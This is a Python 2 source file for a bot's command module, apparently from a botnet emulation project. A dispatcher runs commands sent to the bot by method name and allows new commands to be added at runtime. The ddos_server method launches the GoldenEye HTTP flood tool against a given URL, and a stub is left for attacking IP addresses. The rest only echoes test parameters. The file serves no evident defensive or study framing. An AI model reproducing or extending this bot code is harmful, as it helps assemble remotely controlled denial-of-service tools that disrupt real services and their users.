#!/usr/bin/env python2
# coding=UTF-8
import logging, string, subprocess, shlex
from resources import emu_config

def executeCurrentCommand(command):
    """Executes a command that has been passed to the bot
    :param command: A dict that contains the command to execute as well as its parameters"""

    assert isinstance(command, dict)
    assert command.has_key("command") and command["command"] != ""

    methodToCall = getattr(BotCommands, command["command"])
    try:
        retval = methodToCall(cmdobject, **command["kwargs"])
        return retval
    except TypeError:
        logging.warning("Command %s got invalid parameters: %s" % (command["command"], command["kwargs"]))


class BotCommands(object):
    """This class collects all methods that can be used as commands for a bot.
    To introduce a new command, simply add it to this class.
    It is also possible to add new methods during runtime."""
    ddos_process = None

    def joinParams(self, hallo, hello):
        """Echos its parameters back"""
        return hallo + hello

    def default_command(self, **kwargs):
        """Echos its parameters back"""
        logging.info("default_command: %s" % kwargs)

    def ddos_server(self, url=None, ip=None, timeout=10):
        if self.ddos_process is None or not self.ddos_process.poll():
            if url:
                logging.debug("Execute goldeneye")
                subprocess.Popen(shlex.split("timeout %d goldeneye %s -m random -w 1 -s 2" % (timeout, url)))
            elif ip:
                # TODO: DDOS eine IP
                pass
            else:
                logging.warning("Neither ip nor url where supplied, DDOS failed")
        else:
            logging.debug("goldeneye is still running")

cmdobject = BotCommands()

if __name__ == '__main__':
    logging.basicConfig(**emu_config.logging_config)


    def newCommand(self, abc):
        return string.swapcase(abc)


    print executeCurrentCommand({"command": "joinParams", "kwargs": {"hallo": "welt", "hello": "world"}})
    print executeCurrentCommand({"command": "default_command", "kwargs": {"hallo": "weilt", "hello": "world"}})
    BotCommands.neuerBefehl = newCommand
    print executeCurrentCommand({"command": "neuerBefehl", "kwargs": {"abc": "AbCdF"}})
